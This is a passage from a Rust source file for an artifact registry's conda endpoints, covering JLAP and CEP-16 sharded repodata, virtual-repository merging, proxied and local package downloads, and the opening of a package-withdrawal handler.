/// hash can never match what the client holds, the client concludes its cached
/// index is stale on every single run, and it refetches the full
/// `repodata.json` anyway (having paid for a JLAP round trip first). 404ing is
/// the documented "no JLAP available" signal and sends the client straight to
/// the full fetch, which is the outcome it would have reached regardless.
async fn repodata_json_jlap(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    if repo.repo_type != RepositoryType::Local {
        return Err((
            StatusCode::NOT_FOUND,
            "JLAP incremental repodata is only available for local/hosted conda repositories; \
             fetch repodata.json",
        )
            .into_response());
    }
    let repodata = build_repodata(&state.db, repo.id, &repo_key, &subdir, false).await?;

    // Serialize repodata identically to how repodata_json serves it
    let json_bytes = serde_json::to_string_pretty(&repodata)
        .unwrap()
        .into_bytes();

    // Build the JLAP file
    let jlap_body = build_bootstrap_jlap(&json_bytes);

    let etag = compute_etag(&jlap_body);

    // Check for conditional request
    if let Some(not_modified) = check_conditional_request(&headers, &etag) {
        return Ok(not_modified);
    }

    // Check for Range request
    if let Some(range_header) = headers
        .get(axum::http::header::RANGE)
        .and_then(|v| v.to_str().ok())
    {
        if let Some(start) = parse_range_start(range_header, jlap_body.len()) {
            let end = jlap_body.len() - 1;
            if start > end {
                // 416 Range Not Satisfiable
                return Ok(Response::builder()
                    .status(StatusCode::RANGE_NOT_SATISFIABLE)
                    .header("Content-Range", format!("bytes */{}", jlap_body.len()))
                    .body(Body::empty())
                    .unwrap());
            }

            let slice = &jlap_body[start..=end];
            return Ok(Response::builder()
                .status(StatusCode::PARTIAL_CONTENT)
                .header(CONTENT_TYPE, "application/json")
                .header(CONTENT_LENGTH, slice.len().to_string())
                .header(
                    "Content-Range",
                    format!("bytes {}-{}/{}", start, end, jlap_body.len()),
                )
                .header("Accept-Ranges", "bytes")
                .header(ETAG, &etag)
                .header(CACHE_CONTROL, "public, max-age=60")
                .body(Body::from(slice.to_vec()))
                .unwrap());
        }
    }

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/json")
        .header(CONTENT_LENGTH, jlap_body.len().to_string())
        .header("Accept-Ranges", "bytes")
        .header(ETAG, &etag)
        .header(CACHE_CONTROL, "public, max-age=60")
        .body(Body::from(jlap_body))
        .unwrap())
}

/// Parse a `Range: bytes=N-` header and return the start offset.
fn parse_range_start(range_header: &str, total_len: usize) -> Option<usize> {
    let range = range_header.strip_prefix("bytes=")?;
    if let Some(start_str) = range.strip_suffix('-') {
        let start: usize = start_str.parse().ok()?;
        if start < total_len {
            return Some(start);
        }
    }
    // Handle "bytes=N-M" format
    let parts: Vec<&str> = range.splitn(2, '-').collect();
    if parts.len() == 2 {
        let start: usize = parts[0].parse().ok()?;
        if start < total_len {
            return Some(start);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/keys/repo.pub
// ---------------------------------------------------------------------------

/// Return the repository's RSA public key in PEM format.
async fn repo_public_key(
    State(state): State<SharedState>,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;

    let signing_svc = SigningService::new(state.db.clone(), &state.config.jwt_secret);
    let public_key = signing_svc
        .get_repo_public_key(repo.id)
        .await
        .map_err(|e| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("Signing service error: {}", e),
            )
                .into_response()
        })?;

    match public_key {
        Some(pem) => Ok(Response::builder()
            .status(StatusCode::OK)
            .header(CONTENT_TYPE, "application/x-pem-file")
            .header(CONTENT_LENGTH, pem.len().to_string())
            .body(Body::from(pem))
            .unwrap()),
        None => Err((
            StatusCode::NOT_FOUND,
            "No signing key configured for this repository",
        )
            .into_response()),
    }
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/current_repodata.json
// ---------------------------------------------------------------------------

async fn current_repodata_json(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    let repodata = build_repodata(&state.db, repo.id, &repo_key, &subdir, true).await?;

    let body = serde_json::to_string_pretty(&repodata)
        .unwrap()
        .into_bytes();

    Ok(cacheable_response(body, "application/json", &headers).await)
}

// ---------------------------------------------------------------------------
// CEP-16 Sharded Repodata (reduces bandwidth by ~35x vs monolithic repodata)
// ---------------------------------------------------------------------------

/// CEP-16 shard index: maps package names to content-addressed shard hashes.
///
/// Clients fetch this to discover which shards they need, then fetch
/// individual shards only for packages they care about.
fn group_artifacts_by_name<'a>(
    artifacts: &[&'a CondaArtifact],
) -> BTreeMap<String, Vec<&'a CondaArtifact>> {
    let mut by_name: BTreeMap<String, Vec<&CondaArtifact>> = BTreeMap::new();
    for artifact in artifacts {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        if !is_conda_package(filename) {
            continue;
        }
        let name = artifact
            .metadata
            .as_ref()
            .and_then(|m| m.get("name").and_then(|v| v.as_str()))
            .unwrap_or(&artifact.name);
        by_name.entry(name.to_string()).or_default().push(artifact);
    }
    by_name
}

/// CEP-16 sharded repodata is only built from artifacts already present in
/// our own DB, scoped to *this* repository's id (see [`list_conda_artifacts`]) -
/// it never proxies an upstream's real shard index and never aggregates
/// members. For a Local repo that's exactly right: our DB is the source of
/// truth. For anything else it isn't, and the failure mode is the same in every
/// case - a syntactically valid but semantically empty (or incomplete) shard
/// index served with 200, which a CEP-16-aware client treats as authoritative
/// and will NOT fall back from, silently hiding every package:
///
///   * **Remote**: an upstream like conda-forge that has not yet been mirrored
///     into our DB has no rows here at all.
///   * **Virtual** (#2915): `list_conda_artifacts` is scoped to the virtual
///     repo's own id, and a virtual repo owns no artifacts - its MEMBERS do. So
///     a virtual conda repo always served an empty shard index, even though
///     `repodata.json` for the same repo is correctly aggregated by
///     [`build_virtual_repodata`].
///   * **Staging / anything else**: a staging repo's own rows would in fact be
///     authoritative, but 404ing is the conservative direction (the client
///     falls back to `repodata.json`, which is complete for a hosted repo, so
///     the only cost is the CEP-16 bandwidth saving). Failing closed also
///     covers a `repo_type` this code does not know about — `RepoInfo::repo_type`
///     is a raw string and `resolve_repo_by_key` yields an empty one when the
///     column read fails.
///
/// Until sharded repodata is actually proxied/aggregated, only Local repos may
/// answer here; everyone else 404s so clients (pixi, conda) take the documented
/// fallback to `repodata.json`.
#[allow(clippy::result_large_err)]
fn reject_unsupported_sharding_repo_type(repo: &RepoInfo) -> Result<(), Response> {
    if repo.repo_type != RepositoryType::Local {
        return Err((
            StatusCode::NOT_FOUND,
            "Sharded repodata (CEP-16) is only available for local/hosted conda repositories; \
             use repodata.json",
        )
            .into_response());
    }
    Ok(())
}

async fn sharded_repodata_index(
    State(state): State<SharedState>,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    reject_unsupported_sharding_repo_type(&repo)?;
    let all_artifacts = list_conda_artifacts(&state.db, repo.id).await?;
    let subdir_artifacts = artifacts_for_subdir(&all_artifacts, &subdir);
    let by_name = group_artifacts_by_name(&subdir_artifacts);

    // Build shard for each package name and compute content hash
    let mut shards_map: BTreeMap<String, Vec<u8>> = BTreeMap::new();
    for (pkg_name, artifacts) in &by_name {
        let shard = build_shard(&subdir, artifacts);
        let shard_compressed = serialize_msgpack_zst(&shard)?;

        let mut hasher = Sha256::new();
        hasher.update(&shard_compressed);
        let hash_bytes: Vec<u8> = hasher.finalize().to_vec();

        shards_map.insert(pkg_name.clone(), hash_bytes);
    }

    // Build the index
    let base_url = format!("/conda/{}/{}/", repo_key, subdir);
    let index = build_sharded_index(&subdir, &base_url, &shards_map);

    let compressed = serialize_msgpack_zst(&index)?;

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/x-msgpack")
        .header("Content-Encoding", "zstd")
        .header(CONTENT_LENGTH, compressed.len().to_string())
        .header("Cache-Control", "public, max-age=60")
        .body(Body::from(compressed))
        .unwrap())
}

/// CEP-16 individual shard: all metadata for one package name.
///
/// Shards are content-addressed (filename = SHA256 of content), so they
/// can be cached indefinitely.
async fn sharded_repodata_shard(
    State(state): State<SharedState>,
    Path((repo_key, subdir, shard_hash)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    let hash_hex = shard_hash.trim_end_matches(".msgpack.zst");
    if hash_hex.len() != 64 || !hash_hex.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err((
            StatusCode::BAD_REQUEST,
            "Invalid shard hash (expected 64 hex chars)",
        )
            .into_response());
    }

    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    reject_unsupported_sharding_repo_type(&repo)?;
    let all_artifacts = list_conda_artifacts(&state.db, repo.id).await?;
    let subdir_artifacts = artifacts_for_subdir(&all_artifacts, &subdir);
    let by_name = group_artifacts_by_name(&subdir_artifacts);

    // Find the shard matching the requested hash
    for artifacts in by_name.values() {
        let shard = build_shard(&subdir, artifacts);
        let shard_compressed = serialize_msgpack_zst(&shard)?;

        let mut hasher = Sha256::new();
        hasher.update(&shard_compressed);
        let computed_hash = format!("{:x}", hasher.finalize());

        if computed_hash == hash_hex {
            return Ok(Response::builder()
                .status(StatusCode::OK)
                .header(CONTENT_TYPE, "application/x-msgpack")
                .header("Content-Encoding", "zstd")
                .header(CONTENT_LENGTH, shard_compressed.len().to_string())
                .header("Cache-Control", "public, max-age=31536000, immutable")
                .body(Body::from(shard_compressed))
                .unwrap());
        }
    }

    Err((StatusCode::NOT_FOUND, "Shard not found").into_response())
}

/// Extract a repodata entry JSON object from an artifact's metadata.
/// Shared by `build_repodata` and `build_shard` to avoid duplication.
fn build_artifact_entry(
    artifact: &CondaArtifact,
    filename: &str,
    subdir: &str,
) -> serde_json::Value {
    let meta = artifact.metadata.as_ref();
    let meta_str = |field| {
        meta.and_then(|m| m.get(field).and_then(|v| v.as_str()))
            .unwrap_or("")
    };
    let meta_json = |field| {
        meta.and_then(|m| m.get(field))
            .cloned()
            .unwrap_or_else(|| serde_json::json!([]))
    };

    let pkg_name = meta
        .and_then(|m| m.get("name").and_then(|v| v.as_str()))
        .unwrap_or(&artifact.name);
    let version = meta
        .and_then(|m| m.get("version").and_then(|v| v.as_str()))
        .or(artifact.version.as_deref())
        .unwrap_or("0");
    let build = if meta_str("build").is_empty() {
        "0"
    } else {
        meta_str("build")
    };
    let build_number = meta
        .and_then(|m| m.get("build_number").and_then(|v| v.as_u64()))
        .unwrap_or(0);

    let mut entry = serde_json::json!({
        "build": build,
        "build_number": build_number,
        "constrains": meta_json("constrains"),
        "depends": meta_json("depends"),
        "fn": filename,
        "license": meta_str("license"),
        "md5": meta_str("md5"),
        "name": pkg_name,
        "sha256": artifact.checksum_sha256,
        "size": artifact.size_bytes,
        "subdir": subdir,
        "version": version,
    });

    // Optional fields (only include when non-empty/present)
    for field in &["noarch", "license_family", "features", "track_features"] {
        let val = meta_str(field);
        if !val.is_empty() {
            entry[field] = serde_json::Value::String(val.to_string());
        }
    }
    if let Some(ts) = meta.and_then(|m| m.get("timestamp").and_then(|v| v.as_u64())) {
        entry["timestamp"] = serde_json::json!(ts);
    }

    entry
}

/// Build a CEP-16 shard for a single package name.
///
/// Contains all versions/builds of the package, split into `packages`
/// (v1 .tar.bz2) and `packages.conda` (v2 .conda) maps.
fn build_shard(subdir: &str, artifacts: &[&CondaArtifact]) -> serde_json::Value {
    let mut packages = serde_json::Map::new();
    let mut packages_conda = serde_json::Map::new();

    for artifact in artifacts {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        if !is_conda_package(filename) {
            continue;
        }

        let entry = build_artifact_entry(artifact, filename, subdir);

        if is_conda_v2(filename) {
            packages_conda.insert(filename.to_string(), entry);
        } else {
            packages.insert(filename.to_string(), entry);
        }
    }

    serde_json::json!({
        "packages": packages,
        "packages.conda": packages_conda,
        "removed": [],
    })
}

/// Build the CEP-16 shard index.
fn build_sharded_index(
    subdir: &str,
    base_url: &str,
    shards: &BTreeMap<String, Vec<u8>>,
) -> serde_json::Value {
    // Convert binary hashes to hex strings for JSON representation
    // (the msgpack wire format uses raw bytes, but we use serde_json as
    // the intermediate representation, so hex strings are fine here since
    // rmp_serde will serialize them as msgpack strings)
    let shards_hex: BTreeMap<String, String> = shards
        .iter()
        .map(|(k, v)| (k.clone(), hex::encode(v)))
        .collect();

    serde_json::json!({
        "info": {
            "subdir": subdir,
            "base_url": base_url,
            "shards_base_url": "./shards/",
        },
        "shards": shards_hex,
    })
}

// ---------------------------------------------------------------------------
// Repodata generation
// ---------------------------------------------------------------------------

/// List removed conda artifacts for a repo+subdir to populate the `removed` array.
///
/// "Removed" covers two row shapes (#4059):
///   * soft-deleted artifacts (`is_deleted = true`), and
///   * WITHDRAWN artifacts — quarantined or rejected rows the download gate
///     currently blocks. Naming them in `removed` is how a channel tells a
///     conda client to evict a package it already installed from its view,
///     and the predicate is the same [`is_withdrawn`] the listing filter
///     uses, so `removed` and the package maps can never disagree.
///
/// Uses runtime query (not compile-time macro) to avoid needing a live
/// database connection or sqlx-offline cache update.
async fn list_removed_artifacts(
    db: &sqlx::PgPool,
    repo_id: uuid::Uuid,
    subdir: &str,
) -> Result<Vec<String>, Response> {
    /// `(path, is_deleted, quarantine_status, quarantine_until)` — the
    /// soft-delete flag plus the quarantine pair [`is_withdrawn`] reads.
    type RemovedRow = (
        String,
        bool,
        Option<String>,
        Option<chrono::DateTime<chrono::Utc>>,
    );
    let rows: Vec<RemovedRow> = sqlx::query_as(
        "SELECT a.path, a.is_deleted, a.quarantine_status, a.quarantine_until \
             FROM artifacts a \
             WHERE a.repository_id = $1 \
               AND (a.is_deleted = true OR a.quarantine_status IS NOT NULL) \
             ORDER BY a.path",
    )
    .bind(repo_id)
    .fetch_all(db)
    .await
    .map_err(|e| {
        tracing::error!("Database error listing removed artifacts: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    let now = chrono::Utc::now();
    let prefix = format!("{}/", subdir);
    Ok(rows
        .into_iter()
        .filter(|(_, is_deleted, status, until)| {
            *is_deleted || is_withdrawn(status.as_deref(), *until, now)
        })
        .filter_map(|(path, _, _, _)| {
            if path.starts_with(&prefix) {
                let filename = path.rsplit('/').next().unwrap_or(&path);
                if is_conda_package(filename) {
                    return Some(filename.to_string());
                }
            }
            None
        })
        .collect())
}

/// Build repodata.json for a given subdir from the database.
///
/// When `latest_only` is true, only the most recent version of each package
/// is included (for current_repodata.json).
///
/// `repo_key` is included so we can set `base_url` in the `info` section
/// per CEP-15, allowing clients to resolve package downloads from a
/// separate CDN or mirror.
async fn build_repodata(
    db: &sqlx::PgPool,
    repo_id: uuid::Uuid,
    repo_key: &str,
    subdir: &str,
    latest_only: bool,
) -> Result<serde_json::Value, Response> {
    // Validate subdir on read paths (defense-in-depth)
    validate_cep26_subdir(subdir)
        .map_err(|e| (StatusCode::BAD_REQUEST, format!("Invalid subdir: {}", e)).into_response())?;

    let all_artifacts = list_conda_artifacts(db, repo_id).await?;
    let subdir_artifacts = artifacts_for_subdir(&all_artifacts, subdir);

    // If latest_only, keep only the latest version per package name
    let filtered: Vec<&CondaArtifact> = if latest_only {
        let mut latest: BTreeMap<String, &CondaArtifact> = BTreeMap::new();
        for a in &subdir_artifacts {
            let pkg_name = a
                .metadata
                .as_ref()
                .and_then(|m| m.get("name").and_then(|v| v.as_str()))
                .map(|s| s.to_string())
                .unwrap_or_else(|| a.name.clone());

            // Use the first occurrence (already sorted by created_at DESC)
            latest.entry(pkg_name).or_insert(a);
        }
        latest.into_values().collect()
    } else {
        subdir_artifacts
    };

    let mut packages = serde_json::Map::new();
    let mut packages_conda = serde_json::Map::new();

    for artifact in &filtered {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        if !is_conda_package(filename) {
            continue;
        }

        let entry = build_artifact_entry(artifact, filename, subdir);

        if is_conda_v2(filename) {
            packages_conda.insert(filename.to_string(), entry);
        } else {
            packages.insert(filename.to_string(), entry);
        }
    }

    // Collect filenames of soft-deleted packages for the "removed" array
    let removed = list_removed_artifacts(db, repo_id, subdir).await?;

    // CEP-15: base_url tells the client where to download packages from.
    // This allows hosting packages on a separate CDN while serving repodata
    // from the registry itself.
    let base_url = format!("/conda/{}/{}/", repo_key, subdir);

    Ok(build_repodata_envelope(
        subdir,
        &base_url,
        &packages,
        &packages_conda,
        &serde_json::json!(removed),
    ))
}

/// Merge package maps from a source into an accumulator using first-writer-wins.
///
/// Entries already present in the accumulator are not overwritten, so higher-priority
/// members (inserted first) win on conflicts.
fn merge_package_maps(
    target: &mut serde_json::Map<String, serde_json::Value>,
    source: &serde_json::Map<String, serde_json::Value>,
) {
    for (k, v) in source {
        target.entry(k.clone()).or_insert(v.clone());
    }
}

/// Parse upstream repodata JSON and extract `packages` and `packages.conda` maps.
///
/// Returns `(packages, packages_conda)`. Missing keys are returned as empty maps.
fn parse_upstream_repodata(
    content: &[u8],
) -> Option<(
    serde_json::Map<String, serde_json::Value>,
    serde_json::Map<String, serde_json::Value>,
)> {
    let value: serde_json::Value = serde_json::from_slice(content).ok()?;
    let packages = value
        .get("packages")
        .and_then(|v| v.as_object())
        .cloned()
        .unwrap_or_default();
    let packages_conda = value
        .get("packages.conda")
        .and_then(|v| v.as_object())
        .cloned()
        .unwrap_or_default();
    Some((packages, packages_conda))
}

/// Parse upstream channeldata JSON and extract the `packages` map.
fn parse_upstream_channeldata(
    content: &[u8],
) -> Option<serde_json::Map<String, serde_json::Value>> {
    let value: serde_json::Value = serde_json::from_slice(content).ok()?;
    value.get("packages").and_then(|v| v.as_object()).cloned()
}

/// Build a channeldata entry for a single conda artifact from its metadata.
fn build_channeldata_entry(
    version: Option<&str>,
    metadata: Option<&serde_json::Value>,
) -> serde_json::Value {
    let subdir = metadata
        .and_then(|m| m.get("subdir").and_then(|v| v.as_str()))
        .unwrap_or("noarch");
    let meta_str = |field: &str| {
        metadata
            .and_then(|m| m.get(field).and_then(|v| v.as_str()))
            .unwrap_or("")
    };
    let mut entry = serde_json::json!({
        "subdirs": [subdir],
        "version": version.unwrap_or("0"),
        "license": meta_str("license"),
        "summary": meta_str("summary"),
    });
    // The remaining channeldata fields come from the package's about.json and
    // are omitted when the package did not declare them (#4038).
    if let Some(metadata) = metadata {
        let mut fields = BTreeMap::new();
        merge_channeldata_fields(&mut fields, metadata);
        for (key, value) in fields {
            entry[key] = serde_json::Value::String(value);
        }
    }
    entry
}

/// Build merged repodata.json for a virtual repository by combining member repos.
///
/// Members are iterated in priority order (from `virtual_repo_members` table).
/// For hosted/local members, we query their artifacts directly. For remote members,
/// we proxy their upstream repodata and parse it. The merge uses first-writer-wins
/// semantics: if two members provide the same filename, the higher-priority member
/// (lower priority number) wins.
async fn build_virtual_repodata(
    db: &sqlx::PgPool,
    auth: Option<&AuthExtension>,
    proxy_service: Option<&crate::services::proxy_service::ProxyService>,
    virtual_repo_id: uuid::Uuid,
    virtual_repo_key: &str,
    subdir: &str,
) -> Result<serde_json::Value, Response> {
    validate_cep26_subdir(subdir)
        .map_err(|e| (StatusCode::BAD_REQUEST, format!("Invalid subdir: {}", e)).into_response())?;

    // Caller-authorized member walk (#3323): repodata is content, so a member
    // this caller may not read directly contributes neither its packages nor
    // its upstream's.
    let members = proxy_helpers::authorized_virtual_members(db, auth, virtual_repo_id).await?;

    let mut merged_packages = serde_json::Map::new();
    let mut merged_packages_conda = serde_json::Map::new();

    // Collect from remote members using shared helper
    let upstream_path = format!("{}/repodata.json", subdir);
    let remote_data = proxy_helpers::collect_virtual_metadata(
        db,
        auth,
        proxy_service,
        virtual_repo_id,
        &upstream_path,
        |bytes, _member_key| async move {
            parse_upstream_repodata(&bytes).ok_or_else(|| {
                (StatusCode::BAD_GATEWAY, "Failed to parse upstream repodata").into_response()
            })
        },
    )
    .await?;

    for (_member_key, (pkgs, pkgs_conda)) in &remote_data {
        merge_package_maps(&mut merged_packages, pkgs);
        merge_package_maps(&mut merged_packages_conda, pkgs_conda);
    }

    // Handle hosted/local members
    for member in &members {
        if member.repo_type != RepositoryType::Remote {
            let artifacts = list_conda_artifacts(db, member.id).await?;
            let subdir_artifacts = artifacts_for_subdir(&artifacts, subdir);

            for artifact in &subdir_artifacts {
                let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
                if !is_conda_package(filename) {
                    continue;
                }
                let entry = build_artifact_entry(artifact, filename, subdir);
                if is_conda_v2(filename) {
                    merged_packages_conda
                        .entry(filename.to_string())
                        .or_insert(entry);
                } else {
                    merged_packages.entry(filename.to_string()).or_insert(entry);
                }
            }
        }
    }

    let base_url = format!("/conda/{}/{}/", virtual_repo_key, subdir);

    Ok(build_repodata_envelope(
        subdir,
        &base_url,
        &merged_packages,
        &merged_packages_conda,
        &serde_json::json!([]),
    ))
}

/// Build merged channeldata.json for a virtual repository.
async fn build_virtual_channeldata(
    db: &sqlx::PgPool,
    auth: Option<&AuthExtension>,
    proxy_service: Option<&crate::services::proxy_service::ProxyService>,
    virtual_repo_id: uuid::Uuid,
) -> Result<serde_json::Value, Response> {
    // Caller-authorized member walk (#3323).
    let members = proxy_helpers::authorized_virtual_members(db, auth, virtual_repo_id).await?;

    let mut merged_packages = serde_json::Map::new();

    // Collect from remote members using shared helper
    let remote_data = proxy_helpers::collect_virtual_metadata(
        db,
        auth,
        proxy_service,
        virtual_repo_id,
        "channeldata.json",
        |bytes, _member_key| async move {
            parse_upstream_channeldata(&bytes).ok_or_else(|| {
                (
                    StatusCode::BAD_GATEWAY,
                    "Failed to parse upstream channeldata",
                )
                    .into_response()
            })
        },
    )
    .await?;

    for (_member_key, pkgs) in &remote_data {
        merge_package_maps(&mut merged_packages, pkgs);
    }

    // Handle hosted/local members
    for member in &members {
        if member.repo_type != RepositoryType::Remote {
            let artifacts = list_conda_artifacts(db, member.id).await?;
            for artifact in &artifacts {
                let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
                if !is_conda_package(filename) {
                    continue;
                }
                let pkg_name = artifact
                    .metadata
                    .as_ref()
                    .and_then(|m| m.get("name").and_then(|v| v.as_str()))
                    .map(|s| s.to_string())
                    .unwrap_or_else(|| artifact.name.clone());

                merged_packages.entry(pkg_name).or_insert_with(|| {
                    build_channeldata_entry(artifact.version.as_deref(), artifact.metadata.as_ref())
                });
            }
        }
    }

    Ok(serde_json::json!({
        "channeldata_version": 1,
        "packages": merged_packages,
    }))
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/{filename} - Download package
// ---------------------------------------------------------------------------

/// `Content-Type` for a conda package download.
///
/// `.tar.bz2` is a tarball; `.conda` (a zip container) and anything else get the
/// generic binary type. Shared by the hosted, Remote-proxied and Virtual arms of
/// [`download_package`] so all three advertise the same type for the same
/// filename — the Remote arm uses it as the fallback for when upstream omits a
/// `Content-Type` of its own.
fn conda_package_content_type(filename: &str) -> &'static str {
    if filename.ends_with(".tar.bz2") {
        "application/x-tar"
    } else {
        "application/octet-stream"
    }
}

async fn download_package(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, subdir, filename)): Path<(String, String, String)>,
    ctx: crate::api::middleware::download_telemetry::DownloadContext,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;

    check_read_access(&state.db, auth.clone(), &repo).await?;

    // Look up artifact by path
    let artifact_path = build_conda_artifact_path(&subdir, &filename);

    let artifact = sqlx::query!(
        r#"
        SELECT id, path, size_bytes, checksum_sha256, storage_key
        FROM artifacts
        WHERE repository_id = $1
          AND is_deleted = false
          AND path = $2
        LIMIT 1
        "#,
        repo.id,
        artifact_path
    )
    .fetch_optional(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Database error looking up package: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?
    .ok_or_else(|| (StatusCode::NOT_FOUND, "Package not found").into_response());

    let artifact = match artifact {
        Ok(a) => a,
        Err(not_found) => {
            if repo.repo_type == RepositoryType::Remote {
                if let (Some(ref upstream_url), Some(ref proxy)) =
                    (&repo.upstream_url, &state.proxy_service)
                {
                    let upstream_path = format!("{}/{}", subdir, filename);
                    // #2915 BLOCKER: this is the PACKAGE path, not a metadata
                    // path, and it used to go through the buffered
                    // `proxy_fetch_capped` at the 8 MiB metadata ceiling. Real
                    // conda packages dwarf that (`python` ~30 MiB, `scipy`
                    // ~17 MiB, `pytorch` far more), so the cap turned every
                    // meaningful package download into a 502 — and the ones that
                    // did fit were still buffered whole in memory, which is the
                    // OOM pattern #895/#1608 removed from every other format's
                    // package download.
                    //
                    // Stream instead, exactly as `try_remote_or_virtual_download`
                    // does for rpm/hex/cran/huggingface and as debian's pool
                    // handler does for `.deb`: the body is teed from upstream to
                    // the client and into the proxy cache without ever being
                    // fully resident. The quarantine gating is unchanged — it
                    // lives inside `ProxyService` (`check_quarantine_until` on
                    // both the fresh-fetch and cache-hit paths) and
                    // `map_proxy_error` still turns a hold into 409 / a rejected
                    // artifact into 403 for the streaming path too.
                    //
                    // `Content-Disposition` is now emitted (the buffered arm
                    // omitted it) so a proxied package matches what the hosted
                    // and Virtual arms below already serve.
                    //
                    // #3556: the repository's REAL format, not the `Generic`
                    // stand-in the format-less helper synthesized. `Conda`
                    // shares `classify_pypi`, whose package-file rule reads the
                    // LEAF of the path; `upstream_path` here is
                    // `<subdir>/<filename>` (`linux-64/numpy-1.26.4-py312.conda`),
                    // so the leaf is the package filename the route was given.
                    // `.conda` and `.tar.bz2` are version-pinned build
                    // artifacts and become immutable instead of expiring every
                    // five minutes; `repodata.json` and the other channel
                    // indexes are not package files and are not served by this
                    // route anyway — they take the metadata arms above, which
                    // classify mutable under every format.
                    let response =
                        proxy_helpers::proxy_fetch_streaming_with_disposition_and_format(
                            proxy,
                            repo.id,
                            &repo_key,
                            upstream_url,
                            &upstream_path,
                            conda_package_content_type(&filename),
                            Some(&filename),
                            crate::models::repository::RepositoryFormat::Conda,
                        )
                        .await?;
                    // #3649: count the proxied serve. The streaming helper answers a warm
                    // cache HIT from storage and a cold MISS from upstream through the same
                    // call, so recording once it resolves counts both -- the cache hit #3649
                    // reported as invisible included -- while a 404/502 still counts nothing.
                    // Keyed on the proxy-cache path this fetch commits under, so the count
                    // lines up with the catalog row the artifact listing renders.
                    proxy_helpers::record_proxy_download(
                        &state,
                        repo.id,
                        &repo_key,
                        &upstream_path,
                        &ctx,
                    )
                    .await;
                    return Ok(response);
                }
            }

            // Virtual repo: try each member in priority order
            if repo.repo_type == RepositoryType::Virtual {
                let db = state.db.clone();
                let upstream_path = format!("{}/{}", subdir, filename);
                let artifact_path_clone = artifact_path.clone();
                let result = proxy_helpers::resolve_virtual_download(
                    &state.db,
                    auth.as_ref(),
                    state.proxy_service.as_deref(),
                    repo.id,
                    &upstream_path,
                    |member_id, location| {
                        let db = db.clone();
                        let state = state.clone();
                        let path = artifact_path_clone.clone();
                        async move {
                            proxy_helpers::local_fetch_by_path(
                                &db, &state, member_id, &location, &path,
                            )
                            .await
                        }
                    },
                )
                .await?;

                return proxy_helpers::stream_fetch_result(
                    result,
                    conda_package_content_type(&filename),
                    Some(&filename),
                );
            }

            return Err(not_found);
        }
    };

    // Read from storage
    let storage = state
        .storage_for_repo(&repo.storage_location())
        .map_err(|e| e.into_response())?;
    // Check quarantine status before serving
    crate::services::quarantine_service::check_artifact_download(&state.db, artifact.id)
        .await
        .map_err(|e| e.into_response())?;

    let stream = storage
        .get_stream(&artifact.storage_key)
        .await
        .map_err(|e| {
            tracing::error!("Storage error reading conda package: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
        })?;

    // Record download
    crate::services::artifact_service::record_download(&state.db, artifact.id, &ctx).await;

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, conda_package_content_type(&filename))
        .header(
            "Content-Disposition",
            format!("attachment; filename=\"{}\"", filename),
        )
        .header(CONTENT_LENGTH, artifact.size_bytes.to_string())
        .header("X-Checksum-SHA256", &artifact.checksum_sha256)
        .body(Body::from_stream(stream))
        .unwrap())
}

// ---------------------------------------------------------------------------
// DELETE /conda/{repo_key}/{subdir}/{filename} - Withdraw package (#4059)
// ---------------------------------------------------------------------------

/// Optional body for the withdrawal endpoint.
#[derive(serde::Deserialize)]
struct WithdrawRequest {
    reason: Option<String>,
}

/// Withdraw ONE package from a hosted conda channel (#4059).
///
/// Withdrawal is purge-via-quarantine, not a hard delete: the artifact row
/// stays in `artifacts` under a permanent quarantine hold (auditable and
/// reversible through the existing quarantine console), the download gate
/// refuses it (409), and — because every repodata variant is built from the
/// quarantine-aware [`list_conda_artifacts`] — it disappears from repodata,
/// current_repodata, the bz2/zst/sig encodings, JLAP, CEP-16 shards,
/// run_exports and channeldata on the next serve, and is named in repodata's
/// `removed` array. A CEP-6 channel notice records the withdrawal and its
/// reason for clients polling `notices.json`.
///
/// Rails, shared with the other destructive paths rather than grown in
/// parallel:
///   * the `delete:artifacts` token scope every format-native delete route
///     enforces (`require_auth_basic_scope`, GHSA-vvc3-h39c-mrq5), plus the
///     instance-admin gate the quarantine console uses (#2912);
///   * the blast-radius ceiling by construction: the lookup is an exact-path
///     equality on `(repository_id, subdir/filename)` returning at most one
///     row — there is no pattern, glob, or version-range form of this
///     endpoint, so one call can never touch more than one package;
///   * the delete primitive itself is `quarantine_service::quarantine_now`
///     (#2912), the same auditable hold the admin console applies — the row
///     the lifecycle/mirror work (#3734/#3990) sweeps and reconciles stays
///     exactly where those paths expect it.
async fn withdraw_package(
    State(state): State<SharedState>,
